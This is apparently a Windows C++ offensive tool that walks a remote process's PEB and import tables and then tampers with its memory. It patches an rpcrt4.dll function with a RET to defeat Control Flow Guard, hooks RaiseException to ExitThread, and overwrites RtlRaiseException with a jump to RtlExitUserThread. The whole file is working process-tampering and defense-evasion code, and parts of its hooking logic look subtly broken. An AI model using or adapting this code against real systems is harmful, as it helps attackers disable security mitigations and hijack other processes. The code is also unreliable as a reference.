// IATHookingRevisited.cpp : Defines the entry point for the console application.
#include <windows.h>
#include <winternl.h>
#include <DbgHelp.h>
#include <Tlhelp32.h>
#include <stdio.h>
#include <psapi.h>
#include "Patcher.h"
#include "Hunter.h"

#define BUFFER_SIZE 0x2000

// Define the function signature for NtQueryInformationProcess
typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

uintptr_t FindRemotePEB(HANDLE hProcess)
{
    HMODULE hNTDLL = LoadLibraryA("ntdll");

    if (!hNTDLL)
        return 0;

    FARPROC fpNtQueryInformationProcess = GetProcAddress(
        hNTDLL,
        "NtQueryInformationProcess"
    );

    if (!fpNtQueryInformationProcess)
        return 0;

    NtQueryInformationProcess_t ntQueryInformationProcess =
        (NtQueryInformationProcess_t)fpNtQueryInformationProcess;

    PROCESS_BASIC_INFORMATION pBasicInfo;
    ULONG dwReturnLength = 0;

    NTSTATUS status = ntQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pBasicInfo,
        sizeof(PROCESS_BASIC_INFORMATION),
        &dwReturnLength
    );

    if (status != 0) {
        return 0;
    }

    return (uintptr_t)pBasicInfo.PebBaseAddress;
}

IPEB* ReadRemotePEB(HANDLE hProcess)
{
    uintptr_t pebAddress = FindRemotePEB(hProcess);

    if (pebAddress == 0) {
        return NULL;
    }

    IPEB* pPEB = new IPEB();

    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        (LPCVOID)pebAddress,
        pPEB,
        sizeof(IPEB),
        0
    );

    if (!bSuccess) {
        delete pPEB;
        return NULL;
    }

    return pPEB;
}

PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
{
    BYTE* lpBuffer = new BYTE[BUFFER_SIZE];

    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        lpImageBaseAddress,
        lpBuffer,
        BUFFER_SIZE,
        0
    );

    if (!bSuccess) {
        delete[] lpBuffer;
        return NULL;
    }

    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;
    PLOADED_IMAGE pImage = new LOADED_IMAGE();

    pImage->FileHeader = (PIMAGE_NT_HEADERS)(lpBuffer + pDOSHeader->e_lfanew);
    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;
    pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    return pImage;
}

PIMAGE_SECTION_HEADER FindSectionHeaderByName(PIMAGE_SECTION_HEADER pHeaders,
    DWORD dwNumberOfSections, const char* pName)
{
    PIMAGE_SECTION_HEADER pHeaderMatch = 0;

    for (DWORD i = 0; i < dwNumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER pHeader = &pHeaders[i];

        if (!_stricmp((char*)pHeader->Name, pName))
        {
            pHeaderMatch = pHeader;
            break;
        }
    }

    return pHeaderMatch;
}

PIMAGE_IMPORT_DESCRIPTOR ReadRemoteImportDescriptors(HANDLE hProcess,
    LPCVOID lpImageBaseAddress,
    PIMAGE_DATA_DIRECTORY pImageDataDirectory)
{
    IMAGE_DATA_DIRECTORY importDirectory = pImageDataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptors =
        new IMAGE_IMPORT_DESCRIPTOR[importDirectory.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR)];

    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        (LPCVOID)((uintptr_t)lpImageBaseAddress + importDirectory.VirtualAddress),
        pImportDescriptors,
        importDirectory.Size,
        0
    );

    if (!bSuccess)
        return 0;

    return pImportDescriptors;
}

char* ReadRemoteDescriptorName(HANDLE hProcess, LPCVOID lpImageBaseAddress,
    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor)
{
    char* pBuffer = new char[BUFFER_SIZE];

    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        (LPCVOID)((uintptr_t)lpImageBaseAddress + pImageImportDescriptor->Name),
        pBuffer,
        BUFFER_SIZE,
        0
    );

    if (!bSuccess) {
        delete[] pBuffer;
        return 0;
    }

    return pBuffer;
}

PIMAGE_THUNK_DATA64 ReadRemoteILT(HANDLE hProcess, LPCVOID lpImageBaseAddress,
    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor)
{
    DWORD dwThunkArrayLen = BUFFER_SIZE / sizeof(IMAGE_THUNK_DATA64);

    PIMAGE_THUNK_DATA64 pILT = new IMAGE_THUNK_DATA64[dwThunkArrayLen];

    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        (LPCVOID)((uintptr_t)lpImageBaseAddress + pImageImportDescriptor->OriginalFirstThunk),
        pILT,
        BUFFER_SIZE,
        0
    );

    if (!bSuccess) {
        delete[] pILT;
        return 0;
    }

    return pILT;
}

PIMAGE_THUNK_DATA64 ReadRemoteIAT(HANDLE hProcess, LPCVOID lpImageBaseAddress,
    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor)
{
    DWORD dwThunkArrayLen = BUFFER_SIZE / sizeof(IMAGE_THUNK_DATA64);

    PIMAGE_THUNK_DATA64 pIAT = new IMAGE_THUNK_DATA64[dwThunkArrayLen];

    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        (LPCVOID)((uintptr_t)lpImageBaseAddress + pImageImportDescriptor->FirstThunk),
        pIAT,
        BUFFER_SIZE,
        0
    );

    if (!bSuccess) {
        delete[] pIAT;
        return 0;
    }

    return pIAT;
}

PIMAGE_IMPORT_BY_NAME ReadRemoteImportByName(HANDLE hProcess,
    LPCVOID lpImageBaseAddress,
    PIMAGE_THUNK_DATA64 pImageThunk)
{
    BYTE* lpImportNameBuffer = new BYTE[BUFFER_SIZE];
    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        (LPCVOID)((uintptr_t)lpImageBaseAddress + pImageThunk->u1.AddressOfData),
        lpImportNameBuffer,
        BUFFER_SIZE,
        0
    );

    if (!bSuccess) {
        delete[] lpImportNameBuffer;
        return 0;
    }

    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)lpImportNameBuffer;

    return pImportByName;
}

PIPEB_LDR_DATA ReadRemoteLoaderData(HANDLE hProcess, PPEB pPEB)
{
    PIPEB_LDR_DATA pLoaderData = new IPEB_LDR_DATA();

    BOOL bSuccess = ReadProcessMemory(
        hProcess,
        pPEB->Ldr,
        pLoaderData,
        sizeof(IPEB_LDR_DATA),
        0
    );

    if (!bSuccess) {
        delete pLoaderData;
        return 0;
    }

    return pLoaderData;
}

PVOID FindRemoteImageBase(HANDLE hProcess, PPEB pPEB, const char* pModuleName)
{
    PIPEB_LDR_DATA pLoaderData = ReadRemoteLoaderData(hProcess, pPEB);

    PVOID firstFLink = pLoaderData->InLoadOrderModuleList.Flink;
    PVOID fLink = pLoaderData->InLoadOrderModuleList.Flink;

    PLDR_MODULE pModule = new LDR_MODULE();

    do
    {
        BOOL bSuccess = ReadProcessMemory(
            hProcess,
            fLink,
            pModule,
            sizeof(LDR_MODULE),
            0
        );

        if (!bSuccess) {
            delete pModule;
            return 0;
        }

        PWSTR pwBaseDllName = new WCHAR[pModule->BaseDllName.MaximumLength / sizeof(WCHAR)];

        bSuccess = ReadProcessMemory(
            hProcess,
            pModule->BaseDllName.Buffer,
            pwBaseDllName,
            pModule->BaseDllName.Length + sizeof(WCHAR),
            0
        );

        if (bSuccess)
        {
            size_t sBaseDllName = pModule->BaseDllName.Length / sizeof(WCHAR) + 1;
            char* pBaseDllName = new char[sBaseDllName];

            WideCharToMultiByte(
                CP_ACP,
                0,
                pwBaseDllName,
                pModule->BaseDllName.Length / sizeof(WCHAR) + 1,
                pBaseDllName,
                (int)sBaseDllName,
                0,
                0
            );

            if (!_stricmp(pBaseDllName, pModuleName)) {
                delete[] pwBaseDllName;
                delete[] pBaseDllName;
                return pModule->BaseAddress;
            }

            delete[] pBaseDllName;
        }

        delete[] pwBaseDllName;

        fLink = pModule->InLoadOrderModuleList.Flink;
    } while (pModule->InLoadOrderModuleList.Flink != firstFLink);

    delete pModule;
    return 0;
}

BOOL HookFunction(HANDLE hProcess, CHAR* pModuleName, CHAR* pFunctionName, PVOID hookAddress) {
  
    DWORD64 dwPEBAddress = FindRemotePEB(hProcess);

    if (!dwPEBAddress)
    {
        printf("Error finding remote PEB\r\n");
        return FALSE;
    }

    IPEB* pPEB = ReadRemotePEB(hProcess);

    if (!pPEB)
    {
        printf("Error reading remote PEB\r\n");
        return FALSE;
    }

    HMODULE hModule = (HMODULE)pPEB->ImageBaseAddress;

    PLOADED_IMAGE pImage = ReadRemoteImage(hProcess, hModule);

    if (!pImage) {
        printf("Error reading remote image\r\n");
        return FALSE;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptors = ReadRemoteImportDescriptors(
        hProcess,
        hModule,
        pImage->FileHeader->OptionalHeader.DataDirectory
    );

    if (!pImportDescriptors) {
        printf("Error reading remote import descriptors\r\n");
        return FALSE;
    }

    for (PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = pImportDescriptors; pImportDescriptor->Name; pImportDescriptor++) {
        char* pName = ReadRemoteDescriptorName(hProcess, hModule, pImportDescriptor);

        if (!pName) {
            printf("Error reading remote descriptor name\r\n");
            continue;
        }

        printf("Checking module: %s\r\n", pName);

        if (!_stricmp(pName, pModuleName)) {
            DWORD dwThunkArrayLen = BUFFER_SIZE / sizeof(IMAGE_THUNK_DATA64);

            PIMAGE_THUNK_DATA64 pILT = ReadRemoteILT(hProcess, hModule, pImportDescriptor);

            if (!pILT) {
                printf("Error reading remote ILT\r\n");
                return FALSE;
            }

            DWORD dwOffset = 0;

            for (dwOffset = 0; dwOffset < dwThunkArrayLen; dwOffset++) {
                PIMAGE_IMPORT_BY_NAME pImportByName = ReadRemoteImportByName(hProcess, hModule, &pILT[dwOffset]);

                if (!pImportByName) {
                    printf("Error reading remote import by name\r\n");
                    return FALSE;
                }

                if (!strcmp((char*)pImportByName->Name, pFunctionName)) {
                    break;
                }
            }

            PIMAGE_THUNK_DATA64 pIAT = ReadRemoteIAT(hProcess, hModule, pImportDescriptor);

            if (!pIAT) {
                printf("Error reading remote IAT\r\n");
                return FALSE;
            }

            DWORD64* dwOriginalAddress = &pIAT[dwOffset].u1.Function;

            printf("Original import address: 0x%p\r\n", (void*)dwOriginalAddress);
            printf("Writing: 0x%p\r\n", (void*)hookAddress);

            if (WriteProcessMemory(hProcess, (PVOID)pIAT[dwOffset].u1.Function, hookAddress, sizeof(DWORD64), 0) != 0) {
                printf("New import address: 0x%p\r\n", hookAddress);
                return TRUE;
            }
            else {
                printf("Error writing new import address: 0x%08x\r\n", GetLastError());
                return FALSE;
            }
        }
    }

    return FALSE;
}

VOID GetModuleTextSection(HMODULE hModule, PDWORD pTextSection, PDWORD pTextSectionSize) {
    printf("[*] Module address: 0x%llx\n", (ULONGLONG)hModule);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS signature\n");
        return;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT signature\n");
        return;
    }

    WORD nSections = ntHeaders->FileHeader.NumberOfSections;
    printf("[*] Number of sections: %d\n", nSections);

    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < nSections; i++)
    {

        if (strcmp((char*)Section->Name, (char*)".text") == 0) {

            *pTextSection = Section->VirtualAddress;
            *pTextSectionSize = Section->SizeOfRawData;
            break;
        }
        else {
			printf("Section: %s\n", Section->Name);
        }
        Section++;
    }
}


void PatchRpcCfg(HANDLE hProcess)
{
    const char* pModuleName = "rpcrt4.dll";
	DWORD textRva = 0;
	DWORD textSize = 0;
    PVOID copAddress;
    PVOID callAddress;
    PVOID targetAddress;
    BYTE patch[] = { 0xc3 };
	HMODULE hMod = GetModuleHandleA(pModuleName);
    BOOL bSuccess = FALSE;

    if (!hMod) {
        goto end;
    }

	GetModuleTextSection(hMod, &textRva, &textSize);
	printf("[*] Text section RVA: 0x%x, Size: 0x%x\n", textRva, textSize);

	copAddress = HuntForCopInstruction((PVOID)((UINT64)hMod + textRva), textSize);
    if (copAddress == NULL) {
        printf("CALL R10 not found\r\n");
        goto end;
    }

	callAddress = HuntForCall((PVOID)((UINT64)copAddress), 0x200, TRUE);

	if (callAddress == NULL) {
        printf("CALL <RpcICall> not found\r\n");
        goto end;
	}
	targetAddress = (PVOID)CalculateCallTarget(hMod, (UINT64)callAddress);
	printf("[*] Target address: 0x%llx\n", (ULONGLONG)targetAddress);

    bSuccess = WriteProcessMemory(hProcess, targetAddress, patch, 1, 0);

end:
    if (!bSuccess)
        printf("[-] Error patching function\r\n");
    else
        printf("[+] CFG patched successfully\r\n");
}


// Use HookFunction to replace RaiseException in kernelbase.dll with a pointer to ExitThread
void PatchKernelBase(HANDLE hProcess)
{
    const char* pModuleName = "kernel32.dll";
    const char* pFunctionName = "RaiseException";

    BOOL bSuccess = HookFunction(
        hProcess,
        (char*)pModuleName,
        (char*)pFunctionName,
        ExitThread
    );

    if (!bSuccess)
        printf("Error hooking function\r\n");
    else
        printf("Function hooked successfully\r\n");
}

void generate_jmp_shellcode(DWORD address, unsigned char* shellcode) {
    shellcode[0] = 0xE9; // jmp instruction
	DWORD relative_address = address - 0x5;
    memcpy(shellcode + 1, &relative_address, sizeof(DWORD));
}

void NtdllExceptionPatch(HANDLE hProcess)
{
    const char* pModuleName = "ntdll.dll";
    const char* hookedFunctionName = "RtlRaiseException";
    const char* targetFunctionName = "RtlExitUserThread";
    unsigned char patch[5] = { 0 };


    HMODULE hMod = GetModuleHandleA(pModuleName);
	if (!hMod) {
		printf("Error getting module handle\r\n");
		return;
	}

	PVOID targetAddress = (PVOID)GetProcAddress(hMod, hookedFunctionName);
    PVOID targetFunction = (PVOID)GetProcAddress(hMod, targetFunctionName);;

	if (!targetAddress || !targetFunction) {
		printf("Error getting function address\r\n");
		return;
	}

	DWORD relativeAddress = (DWORD)((UINT64)targetFunction - (UINT64)targetAddress);

    generate_jmp_shellcode(relativeAddress, patch);
    BOOL bSuccess = WriteProcessMemory(hProcess, targetAddress, patch, sizeof(patch), 0);

    if (!bSuccess)
        printf("Error hooking function\r\n");
    else
        printf("Function hooked successfully\r\n");
}